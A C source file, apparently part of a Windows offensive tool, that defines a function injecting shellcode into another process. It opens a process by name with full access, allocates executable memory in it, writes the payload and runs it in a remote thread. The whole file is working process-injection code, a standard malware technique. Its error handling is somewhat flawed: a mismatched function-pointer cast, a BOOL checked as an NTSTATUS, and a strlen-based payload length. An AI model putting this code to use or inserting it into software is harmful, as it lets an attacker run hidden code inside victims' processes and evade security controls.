#include "utils.h"

#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WINVER _WIN32_WINNT_WIN10

VOID InvokeRemoteShellCode(wchar_t processName[], char* shellCode) {
	//HANDLE pHandle = NtOpenProcess2(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, GetPidFromName(processName));
	HANDLE pHandle = NtOpenProcess2(PROCESS_ALL_ACCESS, GetPidFromName(processName));
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtAllocateVirtualMemory");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtWriteVirtualMemory");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");
	LPVOID address = NULL;
	SIZE_T bytesWritten = 0;
	NTSTATUS status = 0;
	SIZE_T size = strlen(shellCode) * sizeof(char) * 2;
	if (!(address = VirtualAllocEx(pHandle, address, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("Error in NtAllocateVirtualMemory, the status is: %x", GetLastError());
		return;
	}
	SIZE_T sz = (SIZE_T)strlen(shellCode);

	if (!(NT_SUCCESS(status = WriteProcessMemory(pHandle, address, (LPCVOID)shellCode, (SIZE_T)sz, &bytesWritten)))) {
		printf("Error in NtWriteVirtualMemory, the status is: %x.\nThe number of bytes have been written: %d", status, bytesWritten);
		return;
	}
	//NTSTATUS rs = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, (LPTHREAD_START_ROUTINE)address, NULL, FALSE, 0, 0, 0, NULL);
	HANDLE tHandle = CreateRemoteThreadEx(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL, NULL);
	if (!tHandle) {
		printf("I failed creating the thread, the return status is %x\n", GetLastError());
		return;
	}
	WaitForSingleObject(tHandle, 30000);
}